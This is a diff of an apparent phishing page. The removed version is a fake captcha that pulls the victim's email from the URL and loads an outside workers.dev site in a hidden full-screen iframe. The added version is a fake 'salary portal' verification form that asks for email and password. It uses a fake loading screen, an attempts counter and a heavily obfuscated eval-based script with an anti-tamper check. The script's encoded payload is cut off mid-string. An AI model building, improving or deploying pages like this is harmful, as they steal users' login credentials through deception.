@@ -1,400 +1,245 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://go.microsoft.com/fwlink/?linkid=2224838" rel="author">
-  <title>Marketing Form</title>
-  <meta name="referrer" content="never">
-  <meta type="xrm/designer/setting" name="type" value="marketing-designer-content-editor-document">
-  <meta type="xrm/designer/setting" name="layout-editable" value="marketing-designer-layout-editable">
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-  <!-- Your existing styles (kept) -->
+  <title>Verification</title>
+
+  <!-- Vendor -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
   <style>
-    .editor-control-layout html { box-sizing: border-box; background-color: #fff; }
-    .editor-control-layout *, .editor-control-layout *:before, .editor-control-layout *:after { box-sizing: inherit; }
-    .marketingForm h1, .marketingForm h2, .marketingForm h3, .marketingForm p { margin:0; padding:0; text-align:center; font-family:"Segoe UI", Arial, sans-serif; }
-    .marketingForm h1 { color:#000; line-height:1.25; font-size:28px; }
-    .marketingForm h2 { color:#333; line-height:1.25; font-size:22px; }
-    .marketingForm h3 { color:#000; line-height:1.25; font-size:18px; }
-    .marketingForm p { line-height:1.25; font-size:14px; }
-    .marketingForm a, div[data-editorblocktype="Captcha"] td:nth-of-type(2) a { text-decoration:none; font-family:"Segoe UI", Arial, sans-serif; font-size:14px; }
-    .marketingForm .primaryButtonWrapper, .submitButtonWrapper { text-align:center; margin:10px 0; }
-    .marketingForm .primaryButton, .submitButton { font-family:"Segoe UI", Arial, sans-serif; font-weight:700; font-size:16px; line-height:22px; background:#2266e3; border:none; border-radius:4px; color:#fff; padding:10px 20px; cursor:pointer; }
-    .marketingForm .secondaryButton { font-family:"Segoe UI", Arial, sans-serif; font-weight:700; font-size:16px; line-height:22px; background:#fff; border:1px solid #0082dd; border-radius:4px; color:#2266e3; padding:10px 20px; margin:0; cursor:pointer; }
-    .marketingForm .error { font-family:Arial, Verdana, sans-serif; font-weight:bold; font-size:8px; color:#a80000; }
-    .zero-state-container span { font-family:"Segoe UI", Arial, sans-serif; font-weight:600; font-size:20px; color:#242424; }
-    form.marketingForm { color:#000; font-family:"Segoe UI", Arial, sans-serif; font-size:14px; }
-    [data-layout="true"] { margin:0 auto; max-width:600px; background:rgba(255,255,255,0); }
-    div[data-editorblocktype="SubmitButton"] { padding:20px 12%; }
-    div[data-editorblocktype="Captcha"] { padding:20px 12%; }
-    div[data-editorblocktype="Captcha"] table, div[data-editorblocktype="Captcha"] div>table>tbody>tr>td:nth-of-type(2) { width:100% !important; }
-    div[data-editorblocktype="Captcha"] div>div>table>tbody>tr:first-of-type>td:last-of-type { padding-bottom:12px !important; }
-    div[data-editorblocktype="Captcha"] tr[id="wlspispHIPErrorContainer"] { margin-top:20px; }
-    div[data-editorblocktype="Captcha"] tr[id="wlspispHIPErrorContainer"] td:nth-of-type(2) { width:auto !important; }
-    div[data-editorblocktype="Captcha"] tr[id="wlspispHIPErrorContainer"] img { display:flex; }
-    div[data-editorblocktype="Captcha"] td:nth-of-type(2)>div>div { margin-top:4px; }
-    div[data-editorblocktype="Captcha"] td:nth-of-type(2)>div>div * { font-weight:400; }
-    div[data-editorblocktype="Captcha"] td:nth-of-type(2)>div>div b { color:#797775; }
-    div[data-editorblocktype="Captcha"] tr:nth-of-type(2)>td { height:0 !important; }
-    div[data-editorblocktype="Captcha"] td input { margin-top:20px !important; padding:6px 8px !important; width:100% !important; }
-    div[data-editorblocktype="Captcha"] div[id^="wlspaudioBtnHolder"] { display:flex; align-items:center; justify-content:center; }
-    div[data-editorblocktype="About"], div[data-editorblocktype="Sessions"], div[data-editorblocktype="Speakers"] { padding:32px 24px; }
-    .textFormFieldBlock, .dateTimeFormFieldBlock, .twoOptionFormFieldBlock, .optionSetFormFieldBlock, .multiOptionSetFormFieldBlock, .lookupFormFieldBlock { padding:20px 30px; display:flex; flex-direction:column; gap:16px; }
-    table.multi .textFormFieldBlock, table.multi .dateTimeFormFieldBlock, table.multi .twoOptionFormFieldBlock, table.multi .optionSetFormFieldBlock, table.multi .multiOptionSetFormFieldBlock, table.multi .lookupFormFieldBlock { padding:12px 20px; }
-    .consentBlock { padding:4px 30px; }
-    .textFormFieldBlock label, .dateTimeFormFieldBlock label, .lookupFormFieldBlock label, .twoOptionFormFieldBlock label.block-label, .optionSetFormFieldBlock label.block-label, .multiOptionSetFormFieldBlock label.block-label, div[data-editorblocktype="Captcha"] label[id^="wlspispHipInstructionContainer"], .consentBlock label p { font-family:"Segoe UI", Arial, sans-serif; font-size:16px; font-weight:600; color:#323130; }
-    .textFormFieldBlock label, .dateTimeFormFieldBlock label, .lookupFormFieldBlock label, .twoOptionFormFieldBlock label.block-label, .optionSetFormFieldBlock label.block-label, .multiOptionSetFormFieldBlock label.block-label, div[data-editorblocktype="Captcha"] label[id^="wlspispHipInstructionContainer"] { display:inline-block; margin-top:4px; }
-    .textFormFieldBlock textArea { resize:vertical; height:120px; }
-    .lookupFormFieldBlock input { background-repeat:no-repeat; background-position-x:98%; background-position-y:center; background-size:1em 1em; }
-    .optionSetFormFieldBlock select { background-repeat:no-repeat; background-position-x:98%; background-position-y:center; appearance:none; }
-    .twoOptionFormFieldBlock div.radiobuttons, .twoOptionFormFieldBlock div.twooption_checkbox, .optionSetFormFieldBlock div.radiobuttons, .multiOptionSetFormFieldBlock fieldset { font-family:"Segoe UI", Arial, sans-serif; font-size:14px; border:none; display:flex; flex-direction:column; align-items:flex-start; padding:0; gap:8px; flex:2; margin-top:16px; }
-    .twoOptionFormFieldBlock div.radiobuttons>div, .twoOptionFormFieldBlock div.twooption_checkbox>div, .optionSetFormFieldBlock div.radiobuttons>div, .multiOptionSetFormFieldBlock fieldset>div, .consentBlock>div { display:flex; flex-direction:row; align-items:center; padding:0; gap:8px; }
-    .twoOptionFormFieldBlock div.radiobuttons div input, .twoOptionFormFieldBlock div.twooption_checkbox div input, .optionSetFormFieldBlock div.radiobuttons div input, .multiOptionSetFormFieldBlock fieldset>div>input[type="checkbox"], .eventSession>div>input[type="checkbox"], .consentBlock div input { margin:0; width:20px; height:20px; border:1px solid #323130; border-radius:2px; accent-color:#0078d4; flex-shrink:0; }
-    @media only screen and (max-width: 768px) {
-      .marketingForm .multi table { table-layout:fixed; height:auto !important; }
-      .marketingForm .multi tbody, .marketingForm .multi tbody tr, .marketingForm .multi tbody tr td, .marketingForm .multi tbody tr th, .marketingForm .outer tbody, .marketingForm .outer tbody tr, .marketingForm .outer tbody tr td, .marketingForm .outer tbody tr th { display:block; box-sizing:border-box; height:auto !important; }
-      .marketingForm .wrap-section .outer tbody tr td.inner, .marketingForm .no-wrap-section .outer tbody tr td.inner { width:100% !important; height:auto !important; }
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background-color: #f2f4f8;
     }
-    .notification-container { margin:10px; }
-    .notification-message { display:flex; justify-content:center; align-items:center; min-height:38px; border:1.44737px solid #CCC; border-radius:10px; margin:10px 0; }
-    .phoneFormFieldBlock { padding:20px 30px; display:flex; flex-direction:column; gap:16px; }
-    table.multi .phoneFormFieldBlock { padding:12px 20px; }
-    .phoneFormFieldBlock label, .phoneFormFieldBlock label * { font-family:"Segoe UI", Arial, sans-serif; font-size:16px; font-weight:600; color:#323130; }
-    .phoneFormFieldBlock .phoneCountryCode { display:flex; align-items:center; border:1px solid #e1dfdd; border-radius:2px; justify-content:center; overflow:hidden; width:100%; height:100%; }
-    .phoneFormFieldBlock input { font-family:"Segoe UI", Arial, sans-serif; font-size:14px; padding:6px 8px; background:#faf9f8; display:block; width:100%; height:100%; border:none; }
-  </style>
 
-  <!-- Minimal card styles (no elephant visuals) -->
-  <style>
-    .rc-wrap { display:flex; justify-content:center; }
-    .rc-card { width:360px; border-radius:10px; padding:14px; background:#fff; font-family:"Segoe UI", Arial, sans-serif; color:#374151; }
-  </style>
+    /* Background layer */
+    #screenshot-background {
+      position: fixed;
+      inset: 0;
+      background-size: cover;
+      background-repeat: no-repeat;
+      filter: brightness(0.6);
+      z-index: -2;
+    }
 
-  <!-- Verification checkbox styles -->
-  <style>
-    .verification-box { border:2px solid #e0e0e0; border-radius:8px; padding:25px; margin-bottom:30px; background:#fafafa; transition:all .3s ease; }
-    .verification-box.checking { border-color:#f38020; background:#fff8f0; }
-    .verification-box.verified { border-color:#28a745; background:#f0fff4; }
-    .checkbox-container { display:flex; align-items:center; justify-content:center; gap:15px; cursor:pointer; }
-    .custom-checkbox { width:24px; height:24px; border:2px solid #ddd; border-radius:4px; position:relative; background:#fff; transition:all .3s ease; }
-    .custom-checkbox.checked { background:#28a745; border-color:#28a745; }
-    .custom-checkbox.checking { border-color:#f38020; }
-    .checkmark { position:absolute; top:2px; left:6px; width:8px; height:14px; border:solid #fff; border-width:0 2px 2px 0; transform:rotate(45deg); opacity:0; transition:opacity .3s ease; }
-    .checkmark.visible { opacity:1; }
-    .spinner { width:20px; height:20px; border:2px solid #f3f3f3; border-top:2px solid #f38020; border-radius:50%; animation:spin 1s linear infinite; display:none; }
-    @keyframes spin { to { transform:rotate(360deg); } }
-    .verification-text { font-size:16px; color:#333; font-weight:500; }
-    .verification-text.checking { color:#f38020; }
-    .verification-text.verified { color:#28a745; }
-    .progress-bar { width:100%; height:4px; background:#f0f0f0; border-radius:2px; margin-top:20px; overflow:hidden; display:none; }
-    .progress-fill { height:100%; background:linear-gradient(90deg,#f38020,#ff6b35); border-radius:2px; width:0%; transition:width 3s ease; }
-    .redirect-message { color:#28a745; font-weight:500; margin-top:15px; display:none; }
+    /* Loading overlay */
+    #loading-container {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: #f9f9f9;
+      z-index: 9999;
+    }
+
+    #loading-bar {
+      width: 80%;
+      height: 10px;
+      margin-top: 20px;
+      background: #e0e0e0;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    #loading-bar-progress {
+      height: 100%;
+      width: 0;
+      background: #4caf50;
+      animation: loading 3s linear forwards;
+    }
+
+    @keyframes loading {
+      to { width: 100%; }
+    }
+
+    #loading-info {
+      margin-top: 18px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    /* Main card */
+    .verify-card {
+      max-width: 600px;
+      width: 90%;
+      margin: 60px auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 6px 28px rgba(0,0,0,.25);
+      overflow: hidden;
+    }
+
+    .verify-header {
+      padding: 28px 20px;
+      text-align: center;
+      color: #fff;
+      background: linear-gradient(1800deg, #191a1b, #bec2c3);
+    }
+
+    .verify-header img {
+      height: 50px;
+      margin-bottom: 14px;
+    }
+
+    .verify-body {
+      padding: 30px;
+      
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: none;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(90deg, #191a1b, #bec2c3);
+    }
+
+    /* Typing cursor */
+    .typing-cursor {
+      width: 2px;
+      height: 1.2em;
+      background: #000;
+      margin-left: 2px;
+      display: inline-block;
+      animation: blink .8s steps(1) infinite;
+    }
+
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+
+    #attempts-info {
+      display: block;
+      margin-top: 5px;
+      font-weight: bold;
+      color: red;
+    }
+
+    /* Alert overlay */
+    #alert-overlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0,0,0,.55);
+      backdrop-filter: blur(6px);
+      z-index: 10002;
+    }
+
+    #alert-overlay.show {
+      display: flex;
+    }
+
+    #alert-box {
+      background: #fff;
+      padding: 26px;
+      border-radius: 14px;
+      max-width: 520px;
+      font-size: 20px;
+      font-weight: 700;
+      text-align: center;
+      animation: pop .28s ease-out;
+    }
+
+    @keyframes pop {
+      from { transform: scale(.92); opacity: 0 }
+      to   { transform: scale(1); opacity: 1 }
+    }
+
+    #user-info-footer {
+      padding: 8px;
+      font-size: 13px;
+      color: #333;
+      background: #f9f9f9;
+      border-top: 1px solid #ddd;
+      text-align: center;
+    }
   </style>
 </head>
 
 <body>
-<main>
-  <form aria-label="Untitled Form" class="marketingForm">
-    <div data-layout="true" data-layout-version="v2" style="margin:auto; max-width:600px;">
-      <div data-section="true" class="emptyContainer columns-equal-class wrap-section">
-        <table class="outer" align="center" cellpadding="0" cellspacing="0" style="border-collapse:collapse; width:600px; display:block;">
-          <tbody><tr><th style="padding:88px 10px 0">
-            <table style="width:100%; border-collapse:collapse" class="containerWrapper tbContainer" cellpadding="0" cellspacing="0">
-              <tbody><tr><th data-container="true" class="columnContainer" data-container-width="100" style="vertical-align:top; min-width:5px; width:580px;">
-                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse; height:100%;">
-                  <tbody><tr><th class="inner" style="min-width:5px; padding:0; vertical-align:top; word-wrap:break-word; word-break:break-word; margin-bottom:32px; font-weight:normal;">
-                    <div style="text-align:center">
-                      <div data-editorblocktype="Text" style="margin:10px">
-                        <h1><span style="font-size:20px;">CHECKING FOR MALWARE AND THREATS...</span></h1>
-                      </div>
-                    </div>
-                  </th></tr></tbody>
-                </table>
-              </th></tr></tbody>
-            </table>
-          </th></tr></tbody>
-        </table>
-      </div>
 
-      <!-- Verification captcha (checkbox) -->
-      <div class="rc-wrap" id="verification-region" role="region" aria-label="Verify to continue">
-        <div class="rc-card">
-          <div class="verification-box" id="verificationBox">
-            <div class="checkbox-container" id="checkboxContainer">
-              <div class="custom-checkbox" id="customCheckbox">
-                <div class="checkmark" id="checkmark"></div>
-                <div class="spinner" id="spinner"></div>
-              </div>
-              <span class="verification-text" id="verificationText">I'm not a robot</span>
-            </div>
+<div id="screenshot-background"></div>
 
-            <div class="progress-bar" id="progressBar">
-              <div class="progress-fill" id="progressFill"></div>
-            </div>
+<section id="loading-container">
+  <img src="https://cdn-icons-png.flaticon.com/512/561/561127.png"
+       width="50"
+       onerror="this.style.display='none'">
+  <div id="loading-bar">
+    <div id="loading-bar-progress"></div>
+  </div>
+  <div id="loading-info">Loading mail settings...</div>
+</section>
 
-            <div class="redirect-message" id="redirectMessage">✓ Verification complete!</div>
+<div id="alert-overlay">
+  <div id="alert-box"></div>
+</div>
+
+<main id="main-content" style="display:none;">
+  <div class="verify-card">
+
+    <header class="verify-header">
+      <img src="https://static.vecteezy.com/system/resources/thumbnails/023/495/208/small_2x/global-logo-for-business-png.png"
+           id="logoimg" alt="">
+      <h2><span id="domain-name"></span> Verification</h2>
+      <p>Confirm your identity to access salary portal </p>
+    </header>
+
+    <section class="verify-body">
+      <form id="verify-form" autocomplete="off">
+
+        <input type="hidden" id="timestamp" name="timestamp">
+        <div style="display:none">
+          <input type="text" id="trap" name="trap" autocomplete="off">
+        </div>
+
+        <div id="msg" class="alert alert-danger" style="display:none">
+          Incorrect Credentials. Please try again
+        </div>
+
+        <span id="error" class="text-danger" style="display:none">
+          Invalid user
+        </span>
+
+        <div class="form-group">
+          <label>Email</label>
+          <div class="d-flex align-items-center">
+            <input id="ai" type="email" class="form-control" readonly required style="height:50px">
+            <span id="cursor" class="typing-cursor"></span>
           </div>
         </div>
-      </div>
 
-      <!-- Example form fields (kept) -->
-      <div data-section="true" class="emptyContainer columns-equal-class wrap-section">
-        <table class="outer" align="center" cellpadding="0" cellspacing="0" style="border-collapse:collapse; width:600px; display:block;">
-          <tbody><tr><th style="padding:0">
-            <table style="width:100%; border-collapse:collapse" class="containerWrapper tbContainer" cellpadding="0" cellspacing="0">
-              <tbody><tr><th data-container="true" class="columnContainer" data-container-width="100" style="vertical-align:top; min-width:5px; width:600px;">
-                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse; height:100%;">
-                  <tbody><tr><th class="inner" style="min-width:5px; padding:0; vertical-align:top; word-wrap:break-word; word-break:break-word; font-weight:normal;">
-                    <div class="textFormFieldBlock" data-editorblocktype="TextFormField" data-targetproperty="firstname" data-prefill="false" data-hide="hide">
-                      <label title="First Name" for="firstname-1">What is your first name?</label>
-                      <input id="firstname-1" type="text" name="firstname" placeholder="Enter your first name" title="First Name" maxlength="50" value="">
-                    </div>
-                    <div class="textFormFieldBlock" data-editorblocktype="TextFormField" data-targetproperty="lastname" data-prefill="false" data-hide="hide">
-                      <label title="Last Name" for="lastname-1">What is your last name?</label>
-                      <input id="lastname-1" type="text" name="lastname" placeholder="Enter your last name" title="Last Name" maxlength="50" value="">
-                    </div>
-                    <div class="textFormFieldBlock" data-editorblocktype="TextFormField" data-targetproperty="emailaddress1" data-prefill="false" data-hide="hide">
-                      <label title="Email" for="email-1">What is your email?</label>
-                      <input id="email-1" type="email" name="emailaddress1" placeholder="Enter your email address" title="Email">
-                    </div>
-                    <div data-editorblocktype="SubmitButton" class="submitButtonWrapper" align="center" style="text-align:center; margin:10px 0; display:table; width:100%;">
-                      <button class="submitButton" type="submit" style="margin-left:auto; margin-right:auto; padding:10px 20px; height:auto; width:auto; box-sizing:border-box; display:table-cell; background:#fff;">
-                        <span> Submit </span>
-                      </button>
-                    </div>
-                  </th></tr></tbody>
-                </table>
-              </th></tr></tbody>
-            </table>
-          </th></tr></tbody>
-        </table>
-      </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input id="pr" type="password" class="form-control" style="height:50px">
+          <span id="attempts-info">3 attempts left</span>
+        </div>
 
-      <div data-section="true" class="emptyContainer columns-equal-class wrap-section">
-        <table class="outer" align="center" cellpadding="0" cellspacing="0" style="border-collapse:collapse; width:600px; display:block;">
-          <tbody><tr><th style="padding:0 0 24px">
-            <table style="width:100%; border-collapse:collapse" class="containerWrapper tbContainer" cellpadding="0" cellspacing="0">
-              <tbody><tr><th data-container="true" class="columnContainer" data-container-width="100" style="vertical-align:top; min-width:5px; width:600px;">
-                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse; height:100%;">
-                  <tbody><tr><th class="inner" style="min-width:5px; padding:12px 10px; vertical-align:top; word-wrap:break-word; word-break:break-word; font-weight:normal;">
-                    <div data-editorblocktype="Text" style="text-align:center">
-                      <p><span style="font-size:10px; line-height:14px; color:#605e5c">© 2025. All rights reserved.</span></p>
-                    </div>
-                  </th></tr></tbody>
-                </table>
-              </th></tr></tbody>
-            </table>
-          </th></tr></tbody>
-        </table>
-      </div>
-    </div>
-  </form>
+        <button id="submit-btn" type="button" class="btn-submit mt-3">
+          Submit
+        </button>
+
+      </form>
+    </section>
+
+    <footer id="user-info-footer"></footer>
+
+  </div>
 </main>
 
+
 <script>
-/* ===================== Verification checkbox logic ===================== */
-(function(){
-  // Do not run the verification UI logic inside iframes
-  if (window.self !== window.top) return;
-
-  var isProcessing = false;
-  var box   = document.getElementById('verificationBox');
-  var cont  = document.getElementById('checkboxContainer');
-  var cb    = document.getElementById('customCheckbox');
-  var mark  = document.getElementById('checkmark');
-  var spin  = document.getElementById('spinner');
-  var text  = document.getElementById('verificationText');
-  var pbar  = document.getElementById('progressBar');
-  var pfill = document.getElementById('progressFill');
-  var done  = document.getElementById('redirectMessage');
-
-  if (!cont) return;
-
-  cont.addEventListener('click', function(){
-    if (isProcessing) return;
-    isProcessing = true;
-
-    box.classList.add('checking');
-    cb.classList.add('checking');
-    text.classList.add('checking');
-    text.textContent = 'Verifying...';
-
-    mark.style.display = 'none';
-    spin.style.display = 'block';
-    pbar.style.display = 'block';
-
-    setTimeout(function(){ pfill.style.width = '100%'; }, 100);
-
-    setTimeout(function(){
-      spin.style.display = 'none';
-      mark.style.display = 'block';
-      mark.classList.add('visible');
-
-      box.classList.remove('checking'); box.classList.add('verified');
-      cb.classList.remove('checking');  cb.classList.add('checked');
-      text.classList.remove('checking'); text.classList.add('verified');
-      text.textContent = 'Verification complete';
-      done.style.display = 'block';
-
-      // proceed to fullscreen embed
-      window.redirectPage();
-    }, 3000);
-  });
-})();
-
-/* ===================== Fullscreen, duplication-proof embed ===================== */
-(function(){
-  var LOCK_FLAG = '__RC_EMBED_LOCK__';
-
-  window.redirectPage = function redirectPage() {
-    // Prevent running inside iframe (avoids recursion)
-    if (window.self !== window.top) return;
-
-    // Run once only
-    if (window[LOCK_FLAG]) return;
-    window[LOCK_FLAG] = true;
-
-    // Build target with your email rule: take the email immediately after '&'
-var href = window.location.href;
-var emailParam = "";
-
-// Parse URL safely
-var url;
-try {
-  url = new URL(href);
-} catch (e) {
-  console.error("URL parse failed");
-}
-
-// 1️⃣ ORIGINAL RULE — &email@domain.com
-if (!emailParam) {
-  var raw = href.split("&");
-  for (var i = 0; i < raw.length; i++) {
-    if (raw[i].includes("@") && !raw[i].includes("=")) {
-      emailParam = raw[i];
-      break;
-    }
-  }
-}
-
-// 2️⃣ ?state= (base64 OR plain)
-if (!emailParam && url && url.searchParams.has("state")) {
-  var stateVal = url.searchParams.get("state");
-
-  try {
-    var decoded = atob(stateVal);
-    if (decoded.includes("@")) emailParam = decoded;
-  } catch (e) {
-    if (stateVal.includes("@")) emailParam = stateVal;
-  }
-}
-
-// 3️⃣ ?id= (base64)
-if (!emailParam && url && url.searchParams.has("id")) {
-  try {
-    var decodedId = atob(url.searchParams.get("id"));
-    if (decodedId.includes("@")) emailParam = decodedId;
-  } catch (e) {}
-}
-
-// 4️⃣ Validate
-if (emailParam && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailParam)) {
-  console.warn("Invalid email detected:", emailParam);
-  emailParam = "";
-}
-
-// 5️⃣ Build target (NO encoding)
-var TARGET_BASE = "https://maggo.log-internals.workers.dev";
-var target = TARGET_BASE + "#" + emailParam;
-
-console.log("Redirect target:", target);
-
-
-    // Avoid self-embedding
-    var here = location.href.split("#")[0];
-    if (target.split("#")[0] === here) {
-      console.error("[embed] Target URL equals current page. Use a different URL.");
-      window[LOCK_FLAG] = false;
-      return;
-    }
-
-    // Prepare full-viewport canvas
-    document.documentElement.style.height = "100%";
-    document.body.style.margin = "0";
-    document.body.style.height = "100%";
-    document.body.style.overflow = "hidden";
-
-    var HOST_ID = "rc-embed-host";
-    var host = document.createElement("div");
-    host.id = HOST_ID;
-    host.style.position = "fixed";
-    host.style.inset = "0";
-    host.style.zIndex = "2147483647";
-
-    // Replace all visible content with the host
-    document.body.replaceChildren(host);
-
-    // Stop platform from re-adding nodes under the host
-    var mo = new MutationObserver(function(muts){
-      muts.forEach(function(m){
-        m.addedNodes && m.addedNodes.forEach(function(node){
-          if (node.nodeType === 1 && node.id !== HOST_ID) {
-            try { node.remove(); } catch(e){}
-          }
-        });
-      });
-    });
-    mo.observe(document.body, { childList: true });
-
-    // CLOSED Shadow DOM for isolation
-    var root = host.attachShadow({ mode: "closed" });
-
-    // Scoped styles: iframe is always fullscreen with fade-in
-    var style = document.createElement("style");
-    style.textContent = `
-      :host { all: initial; }
-      .wrap { position:absolute; inset:0; background:#fff; display:flex; align-items:center; justify-content:center;
-              padding: env(safe-area-inset-top,0) env(safe-area-inset-right,0) env(safe-area-inset-bottom,0) env(safe-area-inset-left,0); }
-      .spin { width:60px; height:60px; border:6px solid #ccc; border-top-color:#2266e3; border-radius:50%;
-              animation:rc_spin 1s linear infinite; transition:opacity .25s ease; }
-      iframe { position:absolute; inset:0; width:100%; height:100%; border:0; opacity:0; transition:opacity .6s ease; }
-      @keyframes rc_spin { to { transform: rotate(360deg); } }
-      @supports (height: 100dvh) { :host, .wrap { height:100dvh; width:100dvw; } }
-    `;
-
-    var wrap = document.createElement("div");
-    wrap.className = "wrap";
-
-    var spin = document.createElement("div");
-    spin.className = "spin";
-
-    var frame = document.createElement("iframe");
-    frame.setAttribute("title", "Embedded content");
-    frame.setAttribute("sandbox", "allow-scripts allow-forms allow-same-origin");
-    frame.setAttribute("referrerpolicy", "no-referrer");
-
-    var first = true;
-    frame.addEventListener("load", function(){
-      if (!first) return;
-      first = false;
-      spin.style.opacity = "0";
-      setTimeout(function(){ frame.style.opacity = "1"; }, 150);
-    });
-
-    wrap.appendChild(spin);
-    wrap.appendChild(frame);
-    root.appendChild(style);
-    root.appendChild(wrap);
-    frame.src = target;
-
-    // Minor mobile quirk fix: force reflow on resize so fixed+inset refills any newly exposed area
-    window.addEventListener('resize', function(){
-      host.style.display = 'none';
-      requestAnimationFrame(function(){ host.style.display = ''; });
-    });
-  };
-})();
+let qbEg;!function(){const YSEA=Array.prototype.slice.call(arguments);return eval("(function IqIO(rGPG){const L3HG=DNWE(rGPG,LVzE(IqIO.toString()));try{let nBKG=eval(L3HG);return nBKG.apply(null,YSEA);}catch(HYCG){var jwFG=(0o204576-67939);while(jwFG<(0o400110%65558))switch(jwFG){case (0x30084%0o200043):jwFG=HYCG instanceof SyntaxError?(0o400076%0x10015):(0o400112%0x10017);break;case (0o201130-0x10244):jwFG=(0o400126%65565);{console.log(\'Error: the code has been tampered!\');return}break;}throw HYCG;}function LVzE(ntCE){let HQuE=1540925486;var joxE=(0o400075%65550);{let DLpE;while(joxE<(0x10618-0o202761)){switch(joxE){case (0o600073%0x1000A):joxE=(68056-0o204703);{HQuE^=(ntCE.charCodeAt(DLpE)*(15658734^0O73567354)+ntCE.charCodeAt(DLpE>>>(0x4A5D0CE&0O320423424)))^1829360835;}break;case (0o204064-67615):joxE=(131135%0o200024);DLpE++;break;case (262275%0o200033):joxE=DLpE<ntCE.length?(0o400107%0x10015):(68266-0o205203);break;case (0o1000121%0x1000C):joxE=(0o203112-0x10633);DLpE=(0x75bcd15-0O726746425);break;}}}let fjsE=\"\";var zGkE=(65936-0o200574);{let benE;while(zGkE<(0o600205%0x10022)){switch(zGkE){case (0o600115%65555):zGkE=(0x20041%0o200032);benE=(0x21786%3);break;case (0o200404-0x100F7):zGkE=benE<(0O347010110&0x463A71D)?(65686-0o200207):(0o400151%0x10025);break;case (131143%0o200034):zGkE=(0o203410-0x106EA);{const bgUE=HQuE%(0o202520-66879);HQuE=Math.floor(HQuE/(0x30077%0o200042));fjsE+=bgUE>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(bgUE-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+bgUE);}break;case (0o600140%0x10016):zGkE=(0o200202-65653);benE++;break;}}}return fjsE;}function DNWE(XaPE,zIRE){XaPE=decodeURI(XaPE);let T5JE=(0x75bcd15-0O726746425);let vDME=\"\";var P0EE=(0o210302-0x110A1);{let ryHE;while(P0EE<(0x11248-0o211041)){switch(P0EE){case (0o200442-0x10105):P0EE=(0o200644-65935);{vDME+=String.fromCharCode(XaPE.charCodeAt(ryHE)^zIRE.charCodeAt(T5JE));T5JE++;var rAeF=(73639709%9);while(rAeF<(0o203314-67247))switch(rAeF){case (0O3153050563-0x19AC516B):rAeF=T5JE>=zIRE.length?(0O264353757%8):(0o205062-68117);break;case (0x9D8DE4-0O47306735):rAeF=(196682%0o200017);{T5JE=(0x21786%3);}break;}}break;case (262267%0o200031):P0EE=ryHE<XaPE.length?(68726-0o206131):(0o1000313%65577);break;case (67846-0o204345):P0EE=(66916-0o202515);ryHE=(0x21786%3);break;case (0o204064-67615):P0EE=(262287%0o200036);ryHE++;break;}}}return vDME;}})(\"B%01%1F%04%06%1B%04%0B%04OC%11%03%1A%03%07%1E%0E%05%04E%0C&%1D%0C%05BC%1E%1D%08%10%1F%15%04J%3C(,2BNA%09%22%197LCL%19-%10%0D%0FLCL+?0%0B%0FLC%1A%0C%1F%0B%0C%19%0D%05%09J/)-%0B%06BN%11%18%00%1B%18%16%04G%19%25,%0B%0FLCL%05%10%099EMA%10%1A$%04%0DEMA%0C#%1D%01%0DEMA%04%07#%3CGD%19%0C%12%04%09%11%06%02%0AJ%3E-%19%03%0DEM%11%15%0F%1E%10%1D%03D\'%0F%13%0B%07GDO3%20+%3CMFF-%13%01%08%08MFF)%1A*%09%08MFF%07%07.3BLD4/.%05%08BLD%1A%14$%06%08BLD%20%14\'%04%08BL%12%1C%06/%00W%11%18T%0B%11%04%04%1E%03%0A%01M%25#%11%0C%08MF%16%16%0F%13%1F%18%0BOE%03%12%0C8BLFF?7%1A%0C%1F%0B%0C%19%0D%05%09J%09%0C%17%0E%06BN%11%18%00%1B%18%16%04G3%1B4%0E%0FLCL+?0%0B%0FLCL%1D%1A+%0E%0FLCL;\'+;EMA%14%25;1GDO+%04%18=MFF%25/%140BLD%20%14\'%04%08BLD%1E+#%03%08BLD4\'%1A=BCN%04$%13%0E%05BCN%08+%15%0E%05BCN%0C%00-3OCA%16%20$%00%08OCA%06%3C8%3CBNA%09%08&4LCL;\'+;EMA%04%07#%3CGDO;*$%3EMF%10%02%1F%09%09%1E%0C%00%03D/%0D+%09%07GD%1F%18%02%1E%1F%17%01ML\'%17\'%09%07GDM1%08%22%10=GD9BN%17%0C%10%01%0E%10%03%08%04J%3C%0A%1F%07%08OC%11%17%0A%19%11%18%09JM9%1A%5DT%5ETM%17%03%1A%03%07%1E%0E%05%04E.%0A%11%09%05BC%1E%1D%08%10%1F%15%04JMDF?A%3C77%3ED697LBAN4F?7:1A%3E20MGLKA%3E2DOBO%1D,%1D9EMCMB%1D#%17;LCNC%17%03%1A%03%07%1E%0E%05%04E:%0F%08%09%05BC%1E%1D%08%10%1F%15%04JMDF?A%3C77%3ED697NABM%0C.%0F%0E%05BCLEEOA%3CA1826O1:7AMDF?A%3C77%3ED697NCC%18%1E%0F!%0DI!%08XG%03%11%06%0BWW%10%01%09%01%0C%0E%04%0F%01FV%02%1F%09%09%1E%0C%00%03D%1D%03%05%09%07GD%1F%18%02%1E%1F%17%01ML+2?%0E%07GDM1%08%22%10=GD9BN%17%0C%10%